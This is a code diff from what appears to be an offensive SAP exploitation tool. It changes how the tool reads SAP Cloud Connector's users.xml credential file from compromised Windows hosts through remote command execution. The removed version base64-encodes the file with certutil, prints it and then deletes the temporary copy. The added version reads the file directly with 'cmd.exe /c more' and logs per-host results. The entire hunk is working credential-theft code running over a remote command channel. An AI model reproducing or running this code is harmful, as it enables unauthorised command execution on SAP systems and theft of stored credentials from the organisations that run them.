@@ -1928,22 +1928,18 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         print(f"[-] SCC {host}: users.xml not found via "
                               f"{n.sid} on Windows")
                         continue
-                    # certutil -encode reads file and base64-encodes it
-                    tmp = r"C:\Windows\Temp\.scc_users.b64"
-                    certutil_out, _ = _gw(
-                        "cmd.exe",
-                        f"/c certutil -encode \"{fpath}\" \"{tmp}\" && type \"{tmp}\"")
-                    import base64 as _b64e, re as _re2
-                    # certutil wraps in -----BEGIN----- / -----END-----
-                    b64 = "".join(_re2.findall(
-                        r'[A-Za-z0-9+/=]+', certutil_out))
-                    _gw("cmd.exe", f"/c del /q \"{tmp}\" 2>nul")
-                    raw = None
-                    if b64:
-                        try:
-                            raw = _b64e.b64decode(b64)
-                        except Exception as e:
-                            print(f"[-] SCC {host}: certutil decode error: {e}")
+                    # Read with 'more' — user-confirmed to work on Windows SCC.
+                    # certutil base64 output is also truncated by SAPXPG's
+                    # 128-byte line limit causing padding errors.
+                    more_out, more_ok = _gw("cmd.exe", f"/c more \"{fpath}\"")
+                    print(f"[*] SCC {host}: more read → "
+                          f"{len(more_out)}B ok={more_ok} "
+                          f"first={more_out[:60]!r}")
+                    raw = more_out.encode("utf-8", errors="replace") \
+                        if more_out.strip().startswith("<") else None
+                    if raw is None and more_out:
+                        print(f"[-] SCC {host}: more output doesn't look like XML: "
+                              f"{more_out[:80]!r}")
                 else:
                     linux_roots = [
                         "/opt/sap/scc",
